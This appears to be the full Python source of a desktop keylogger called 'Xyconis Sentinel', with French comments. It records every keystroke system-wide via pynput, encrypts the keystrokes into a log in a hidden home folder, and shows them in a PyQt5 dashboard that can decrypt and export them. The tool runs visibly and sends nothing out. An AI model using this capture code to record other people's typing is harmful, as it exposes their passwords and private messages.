#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Xyconis Sentinel v2.0 - Version finale
======================================

- Keylogger (pynput)
- Gestion des fichiers (FileManager) et chiffrement (EncryptionManager)
- LogManager pour lire/écrire/effacer/exporter
- Interface PyQt5 moderne (lecture seule dans les zones de logs)
- Recherche en temps réel (filtrage) dans logs chiffrés et déchiffrés
- Boutons pour pause, actualiser, exporter, effacer

Note : Sur macOS, il faut autoriser l'application (ou Python/IDE) dans
"Input Monitoring" pour que le keylogger ne soit pas interrompu (SIGTRAP).
"""

import os
import sys
import threading
import time
import logging
import base64
from datetime import datetime

from PyQt5 import QtWidgets, QtCore, QtGui
from pynput import keyboard
from cryptography.fernet import Fernet

# -------------------------------------
# Configuration du logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    filename='xyconis_sentinel.log',
    filemode='a'
)

# ===============================
# === Module 1: Fichiers & Chiffrement ===

class FileManager:
    def __init__(self, app_folder=".securetype"):
        self.app_folder = os.path.join(os.path.expanduser("~"), app_folder)
        try:
            os.makedirs(self.app_folder, exist_ok=True)
        except Exception as e:
            logging.error(f"Erreur lors de la création du dossier d'application: {e}")

    def get_file_path(self, filename):
        return os.path.join(self.app_folder, filename)

    def read_file(self, filename, binary=False):
        path = self.get_file_path(filename)
        mode = "rb" if binary else "r"
        if os.path.exists(path):
            try:
                with open(path, mode) as f:
                    return f.read()
            except Exception as e:
                logging.error(f"Erreur de lecture du fichier {filename}: {e}")
        return None

    def write_file(self, filename, content, binary=False):
        path = self.get_file_path(filename)
        mode = "wb" if binary else "w"
        try:
            with open(path, mode) as f:
                f.write(content)
        except Exception as e:
            logging.error(f"Erreur d'écriture dans le fichier {filename}: {e}")

    def append_file(self, filename, content, binary=False):
        path = self.get_file_path(filename)
        mode = "ab" if binary else "a"
        try:
            with open(path, mode) as f:
                f.write(content)
        except Exception as e:
            logging.error(f"Erreur d'ajout dans le fichier {filename}: {e}")

    def delete_file(self, filename):
        path = self.get_file_path(filename)
        if os.path.exists(path):
            try:
                os.remove(path)
                return True
            except Exception as e:
                logging.error(f"Erreur lors de la suppression du fichier {filename}: {e}")
        return False

class EncryptionManager:
    def __init__(self, file_manager, key_filename="cle_chiffrement.key"):
        self.file_manager = file_manager
        self.key_filename = key_filename
        self.key = self._load_or_create_key()

    def _load_or_create_key(self):
        key = self.file_manager.read_file(self.key_filename, binary=True)
        if not key:
            try:
                key = Fernet.generate_key()
                self.file_manager.write_file(self.key_filename, key, binary=True)
            except Exception as e:
                logging.error(f"Erreur lors de la création de la clé de chiffrement: {e}")
        return key

    def encrypt(self, text):
        try:
            cipher = Fernet(self.key)
            enc_bytes = cipher.encrypt(text.encode())
            return base64.b64encode(enc_bytes).decode()
        except Exception as e:
            logging.error(f"Erreur de chiffrement: {e}")
            return None

    def decrypt(self, enc_text):
        try:
            cipher = Fernet(self.key)
            return cipher.decrypt(base64.b64decode(enc_text.strip())).decode()
        except Exception as e:
            logging.error(f"Erreur de déchiffrement: {e}")
            return "[Erreur de déchiffrement]"

# ===============================
# === Module 2: KeyLogger & LogManager ===

class KeyLogger:
    def __init__(self, callback):
        self.callback = callback
        self.running = True
        self.listener = None

    def start(self):
        if not self.listener or not self.listener.is_alive():
            self.running = True
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()
            logging.info("Keylogger démarré.")

    def stop(self):
        self.running = False
        if self.listener and self.listener.is_alive():
            self.listener.stop()
            logging.info("Keylogger arrêté.")

    def _on_key_press(self, key):
        if not self.running:
            return
        try:
            key_text = str(key)
            if key_text.startswith("Key."):
                key_text = f"[{key_text.split('.')[1]}]"
            else:
                key_text = key_text.strip("'")
        except Exception as e:
            key_text = "[Touche spéciale]"
            logging.error(f"Erreur lors du traitement de la touche: {e}")
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.callback(f"{timestamp}: {key_text}")

class LogManager:
    def __init__(self, file_manager, encryption_manager, log_filename="log_chiffre.txt"):
        self.file_manager = file_manager
        self.encryption_manager = encryption_manager
        self.log_filename = log_filename

    def add_log(self, text):
        enc = self.encryption_manager.encrypt(text)
        if enc:
            self.file_manager.append_file(self.log_filename, enc + "\n")
            return enc
        return None

    def get_logs(self):
        c = self.file_manager.read_file(self.log_filename)
        if c:
            return c.splitlines()
        return []

    def clear_logs(self):
        if self.file_manager.delete_file(self.log_filename):
            logging.info("Logs effacés.")
            return True
        logging.error("Erreur lors de l'effacement des logs.")
        return False

    def export_logs(self, path, encrypted=False):
        logs = self.get_logs()
        if not logs:
            return False
        try:
            with open(path, "w") as f:
                for line in logs:
                    if encrypted:
                        f.write(line + "\n")
                    else:
                        dec = self.encryption_manager.decrypt(line)
                        f.write(dec + "\n")
            logging.info(f"Logs exportés vers {path}.")
            return True
        except Exception as e:
            logging.error(f"Erreur lors de l'exportation des logs: {e}")
            return False

    def search_in_logs(self, search_term):
        if not search_term:
            return []
        logs = self.get_logs()
        results = []
        for line in logs:
            dec = self.encryption_manager.decrypt(line)
            if search_term.lower() in dec.lower():
                results.append(dec)
        return results

# ===============================
# === Module 3: Styles QSS (UIManager) ===

class UIManager:
    DARK_STYLE = """
    /* Couleurs principales */
    * {
        font-family: 'Arial';
        font-size: 14px;
        color: #FFFFFF;
    }
    QWidget {
        background-color: #1B1B2F;
    }
    QFrame#Card {
        background-color: #25274D;
        border-radius: 15px;
        border: 1px solid #3D3D6B;
    }
    QLabel#TitleLabel {
        font-size: 18px;
        font-weight: bold;
        color: #FFFFFF;
    }
    QPushButton {
        background-color: #3F3D56;
        border: 1px solid #565480;
        border-radius: 8px;
        padding: 6px;
        font-weight: bold;
    }
    QPushButton:hover {
        background-color: #46456B;
    }
    QPushButton:pressed {
        background-color: #2F2D4A;
    }
    QLineEdit {
        background-color: #2E2E4A;
        border: 1px solid #565480;
        border-radius: 5px;
        padding: 4px;
    }
    QTextEdit {
        background-color: #2E2E4A;
        border: 1px solid #565480;
        border-radius: 5px;
        padding: 5px;
    }
    QMessageBox {
        background-color: #1B1B2F;
    }
    QMessageBox QLabel {
        color: #FFFFFF;
    }
    """

# ===============================
# === Signaux pour mise à jour UI (thread-safety) ===

class KeyUpdateSignal(QtCore.QObject):
    key_received = QtCore.pyqtSignal(str, str)   # (encrypted, plain)
    stats_updated = QtCore.pyqtSignal(int, str)  # (total_keys, last_time)

# ===============================
# === Module 4: Application Principale ===

class ModernSentinelApp(QtWidgets.QMainWindow):
    """
    - Zones de texte en lecture seule (impossible d'effacer manuellement)
    - Recherche en temps réel (filtrage) dans logs chiffrés/déchiffrés
    - Bouton "Effacer Logs" pour supprimer physiquement le fichier
    - Keylogger en arrière-plan (pynput)
    """
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Xyconis Sentinel v2.0 - Modern Dashboard")
        self.resize(1200, 700)
        self.setStyleSheet(UIManager.DARK_STYLE)

        self.is_paused = False
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.total_keys = 0

        self.file_manager = FileManager()
        self.encryption_manager = EncryptionManager(self.file_manager)
        self.log_manager = LogManager(self.file_manager, self.encryption_manager)

        self.key_update_signal = KeyUpdateSignal()
        self.key_update_signal.key_received.connect(self._update_logs_slot)
        self.key_update_signal.stats_updated.connect(self._update_stats_slot)

        self._create_ui()
        self._start_services()

    def _create_ui(self):
        central_widget = QtWidgets.QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QtWidgets.QHBoxLayout(central_widget)

        # Barre latérale
        sidebar = QtWidgets.QFrame()
        sidebar_layout = QtWidgets.QVBoxLayout(sidebar)
        sidebar_layout.setSpacing(20)

        title_label = QtWidgets.QLabel("Xyconis Sentinel")
        title_label.setObjectName("TitleLabel")
        title_label.setAlignment(QtCore.Qt.AlignCenter)
        sidebar_layout.addWidget(title_label)
        sidebar_layout.addSpacing(10)

        btn_pause = QtWidgets.QPushButton("Pause/Reprendre")
        btn_pause.clicked.connect(self._toggle_pause)
        sidebar_layout.addWidget(btn_pause)

        btn_refresh = QtWidgets.QPushButton("Actualiser Logs")
        btn_refresh.clicked.connect(self._refresh_logs)
        sidebar_layout.addWidget(btn_refresh)

        btn_export = QtWidgets.QPushButton("Exporter Logs")
        btn_export.clicked.connect(self._export_logs_dialog)
        sidebar_layout.addWidget(btn_export)

        btn_clear = QtWidgets.QPushButton("Effacer Logs")
        btn_clear.clicked.connect(self._clear_logs)
        sidebar_layout.addWidget(btn_clear)

        sidebar_layout.addStretch()

        main_layout.addWidget(sidebar, 1)

        # Conteneur principal (dashboard)
        dashboard_frame = QtWidgets.QFrame()
        dash_layout = QtWidgets.QVBoxLayout(dashboard_frame)

        # Barre haute
        top_bar = QtWidgets.QFrame()
        top_layout = QtWidgets.QHBoxLayout(top_bar)

        self.status_label = QtWidgets.QLabel("Statut : Actif")
        self.status_label.setStyleSheet("font-size:16px; font-weight:bold; color:#08D9D6;")
        top_layout.addWidget(self.status_label)

        top_layout.addStretch()

        self.search_edit = QtWidgets.QLineEdit()
        self.search_edit.setPlaceholderText("Rechercher en temps réel...")
        self.search_edit.setFixedWidth(300)
        # On appelle la fonction de filtrage à chaque fois que le texte change
        self.search_edit.textChanged.connect(self._update_filtered_logs)
        top_layout.addWidget(self.search_edit)

        self.stats_label = QtWidgets.QLabel("Total frappes : 0 | Dernière frappe : --:--:--")
        self.stats_label.setStyleSheet("font-size:14px; color:#EEEEEE;")
        top_layout.addWidget(self.stats_label)

        dash_layout.addWidget(top_bar)

        # Corps : 2 cadres logs chiffrés / logs déchiffrés
        content_layout = QtWidgets.QHBoxLayout()
        content_layout.setSpacing(15)

        # Card logs chiffrés
        card_enc = QtWidgets.QFrame()
        card_enc.setObjectName("Card")
        card_enc.setLayout(QtWidgets.QVBoxLayout())
        enc_title = QtWidgets.QLabel("Logs Chiffrés")
        enc_title.setStyleSheet("font-weight:bold; font-size:16px;")
        card_enc.layout().addWidget(enc_title)

        self.text_encrypted = QtWidgets.QTextEdit()
        self.text_encrypted.setReadOnly(True)  # Lecture seule
        card_enc.layout().addWidget(self.text_encrypted)

        # Card logs déchiffrés
        card_dec = QtWidgets.QFrame()
        card_dec.setObjectName("Card")
        card_dec.setLayout(QtWidgets.QVBoxLayout())
        dec_title = QtWidgets.QLabel("Logs Déchiffrés")
        dec_title.setStyleSheet("font-weight:bold; font-size:16px;")
        card_dec.layout().addWidget(dec_title)

        self.text_decrypted = QtWidgets.QTextEdit()
        self.text_decrypted.setReadOnly(True)  # Lecture seule
        card_dec.layout().addWidget(self.text_decrypted)

        content_layout.addWidget(card_enc, 1)
        content_layout.addWidget(card_dec, 1)

        dash_layout.addLayout(content_layout, 5)
        main_layout.addWidget(dashboard_frame, 3)

    # ------------------
    # Démarrage keylogger + thread
    def _start_services(self):
        self.keylogger = KeyLogger(self._handle_key_press)
        self.keylogger.start()
        self.buffer_thread = threading.Thread(target=self._process_buffer, daemon=True)
        self.buffer_thread.start()

    def _handle_key_press(self, key_text):
        if self.is_paused:
            return
        enc = self.encryption_manager.encrypt(key_text)
        if enc:
            with self.buffer_lock:
                self.buffer.append((enc, key_text))

    def _process_buffer(self):
        while True:
            if self.buffer:
                with self.buffer_lock:
                    encrypted, plain = self.buffer.pop(0)
                self.log_manager.add_log(plain)
                self.key_update_signal.key_received.emit(encrypted, plain)
                self.total_keys += 1
                now = datetime.now().strftime('%H:%M:%S')
                self.key_update_signal.stats_updated.emit(self.total_keys, now)
            time.sleep(0.01)

    @QtCore.pyqtSlot(str, str)
    def _update_logs_slot(self, encrypted, plain):
        """
        Appelé à chaque frappe ajoutée.
        On se contente de relancer le filtrage en temps réel.
        """
        self._update_filtered_logs()

    @QtCore.pyqtSlot(int, str)
    def _update_stats_slot(self, total, now):
        self.stats_label.setText(f"Total frappes : {total} | Dernière frappe : {now}")

    # ------------------
    # Filtrage en temps réel
    def _update_filtered_logs(self):
        """
        Lit tous les logs, déchiffre chaque ligne, et n'affiche que celles
        contenant la chaîne tapée dans self.search_edit (insensible à la casse).
        """
        search_term = self.search_edit.text().strip().lower()
        all_encrypted = self.log_manager.get_logs()

        self.text_encrypted.clear()
        self.text_decrypted.clear()

        for enc_line in all_encrypted:
            dec_line = self.encryption_manager.decrypt(enc_line)
            if not search_term or (search_term in dec_line.lower()):
                self.text_encrypted.append(enc_line)
                self.text_decrypted.append(dec_line)

    # ------------------
    # Boutons
    def _toggle_pause(self):
        self.is_paused = not self.is_paused
        st = "Pause" if self.is_paused else "Actif"
        col = "#FF2E63" if self.is_paused else "#08D9D6"
        self.status_label.setText(f"Statut : {st}")
        self.status_label.setStyleSheet(f"font-size:16px; font-weight:bold; color:{col};")

    def _refresh_logs(self):
        """
        Forcer la réactualisation (si d'autres process ont modifié le fichier).
        On recharge tout et on applique le filtre actuel.
        """
        self._update_filtered_logs()

    def _export_logs_dialog(self):
        opts = QtWidgets.QFileDialog.Options()
        path, _ = QtWidgets.QFileDialog.getSaveFileName(
            self,
            "Exporter Logs",
            "",
            "Fichiers texte (*.txt);;Tous les fichiers (*)",
            options=opts
        )
        if path:
            rep = QtWidgets.QMessageBox.question(
                self,
                "Exporter",
                "Exporter les logs chiffrés ?\n"
                "Oui pour chiffrés, Non pour déchiffrés.",
                QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No
            )
            enc = (rep == QtWidgets.QMessageBox.Yes)
            if self.log_manager.export_logs(path, enc):
                QtWidgets.QMessageBox.information(self, "Exportation", "Logs exportés avec succès!")
            else:
                QtWidgets.QMessageBox.critical(self, "Erreur", "Échec de l'exportation des logs.")

    def _clear_logs(self):
        """
        Effacer physiquement le fichier de logs (le seul moyen de tout supprimer,
        vu que les QTextEdit sont en lecture seule).
        """
        rep = QtWidgets.QMessageBox.question(
            self,
            "Confirmation",
            "Êtes-vous sûr de vouloir effacer tous les logs?",
            QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No
        )
        if rep == QtWidgets.QMessageBox.Yes:
            if self.log_manager.clear_logs():
                self.text_encrypted.clear()
                self.text_decrypted.clear()
                self.total_keys = 0
                self.stats_label.setText("Total frappes : 0 | Dernière frappe : --:--:--")
                QtWidgets.QMessageBox.information(self, "Information", "Tous les logs ont été effacés.")
            else:
                QtWidgets.QMessageBox.critical(self, "Erreur", "Impossible d'effacer les logs.")

    # ------------------
    # Outils
    def closeEvent(self, event):
        if hasattr(self, 'keylogger') and self.keylogger:
            self.keylogger.stop()
        logging.info("Fermeture de l'application.")
        event.accept()


# ===============================
# === Point d'entrée principal ===
def main():
    app = QtWidgets.QApplication(sys.argv)
    window = ModernSentinelApp()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
